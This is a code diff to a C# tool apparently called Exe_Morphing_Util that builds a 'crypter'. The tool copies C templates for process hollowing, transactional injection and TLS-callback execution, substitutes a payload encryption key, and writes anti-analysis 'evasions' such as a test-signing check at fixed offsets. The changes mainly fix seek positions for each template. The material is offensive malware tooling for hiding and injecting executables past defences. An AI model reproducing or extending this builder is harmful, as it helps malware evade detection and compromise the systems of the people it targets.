@@ -669,7 +669,7 @@ namespace Exe_Morphing_Util
             // with long jmp to our found code cave, have it jump back when done to our EP
             if(cbTLS.Checked)
             {
-                // see if we want to use process hollowing or just extract
+                 // see if we want to use process hollowing or just extract
                 if (rbJustExtract.Checked)
                 {
                     File.Copy("barebones\\dont_touch_me_TLS_callbacks_just_extract.joe", "builder\\joe_crypter.c", true);
@@ -694,9 +694,11 @@ namespace Exe_Morphing_Util
                 // make adjustments to file based on checkboxes
 
                 // now we do our evasions
-                fs.Seek(1956, SeekOrigin.Begin);  // be mindful of where this is. 
 
-                if(cbTestSigning.Checked)
+                fs.Seek(2024, SeekOrigin.Begin);
+
+
+                if (cbTestSigning.Checked)
                 {
                     sw.WriteLine("TestSigningCheck();");
                 }
@@ -887,31 +889,52 @@ namespace Exe_Morphing_Util
         }
         private void evasions_no_tls()
         {
+            int which = 0;
             if (rbJustExtract.Checked)
             {
+                which = 1;
                 File.Copy("barebones\\dont_touch_me_just_extract.joe", "builder\\joe_crypter.c", true);
             }
             else if (rbTransactional.Checked)
             {
+                which = 2;
                 File.Copy("barebones\\dont_touch_me_Transactional.joe", "builder\\joe_crypter.c", true);
             }
             else
             {
+                which = 3;
                 File.Copy("barebones\\dont_touch_me.joe", "builder\\joe_crypter.c", true);
             }
+
+            string replacecrypto = File.ReadAllText("builder\\joe_crypter.c");
+            replacecrypto = replacecrypto.Replace("cryptokey", payloadcryptkey.ToString());
+            File.WriteAllText("builder\\joe_crypter.c", replacecrypto);
+
             FileStream fs = new FileStream("builder\\joe_crypter.c", FileMode.Open);
             StreamWriter sw = new StreamWriter(fs);
 
 
             // set payload cryptokey
-            string replacecrypto = File.ReadAllText("builder\\joe_crypter.c");
-            replacecrypto = replacecrypto.Replace("cryptokey", payloadcryptkey.ToString());
-            File.WriteAllText("builder\\joe_crypter.c", replacecrypto);
+            
 
             // make adjustments to file based on checkboxes
 
             // now we do our evasions
-            fs.Seek(2022, SeekOrigin.Begin);
+            
+            switch (which) // set file stream POS based on what file was chosen
+            {
+                case 1:
+                    fs.Seek(2416, SeekOrigin.Begin);
+                    break;
+                case 2:
+                    fs.Seek(2090, SeekOrigin.Begin);
+                    break;
+                case 3:
+                    fs.Seek(2090, SeekOrigin.Begin);
+                    break;
+            }
+
+            
 
             if (cbTestSigning.Checked)
             {
